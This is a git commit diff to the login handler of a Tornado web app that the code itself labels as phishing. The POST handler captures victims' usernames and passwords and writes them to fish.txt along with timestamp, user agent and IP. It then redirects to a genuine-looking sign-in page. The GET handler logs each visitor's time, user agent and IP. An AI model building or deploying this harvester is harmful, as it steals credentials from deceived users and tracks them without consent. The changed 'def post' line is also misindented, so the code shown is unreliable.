f59688acd40fd00cc0dd527313e9896e800cbe87
purplebird <51992340+purplebird@users.noreply.github.com>
2019-11-01 17:20:11 +0800

    Update login.py
    增加功能：
    1.在visit.txt文件中单独记录页面访问行为的访问时间、UA、IP
    2.补充fish.txt文件中的post时间、UA、IP记录

--- handlers/login.py
+++ handlers/login.py
@@ -16,18 +16,27 @@ class BaseHandler(tornado.web.RequestHandler):
     """ 基础类 """
 
     #----------------------------------------------------------------------
-    def post(self):
+   def post(self):
         """ 钓鱼获取post数据 """
-        email = self.get_arguments('email')
+        username = self.get_arguments('username')
         passowrd = self.get_arguments('password')
+        userAgent = self.request.headers['user-agent'] #获取UA
+        ip = self.request.remote_ip #获取IP
         with open('fish.txt', 'a') as f:
-            f.write('email:'+ str(email) + '|' + 'password:' + str(passowrd))
-            print 'email:'+ str(email) + '|' + 'password:' + str(passowrd)
-        return self.redirect('http://pirogue.org')
+            f.write('username:'+ str(username) + ',' + 'password:' + str(passowrd) + ',' + 'post_time:' + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
+            f.write('\n')
+            print('username:'+ str(username) + ',' + 'password:' + str(passowrd) + ',' + 'post_time:' + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
+        return self.redirect('https://abc.com/signin.html')
     
     def get(self):
+        '''记录访问时间和UA'''
+        userAgent = self.request.headers['user-agent'] #获取UA
+        ip = self.request.remote_ip #获取IP
+        with open('visit.txt', 'a') as f:
+            f.write('visit_time:' +  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
+            f.write('\n')
+            print('visit_time:' +  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
         return self.render('index.html')
-
 
 if __name__ == '__main__':
     unittest.main()
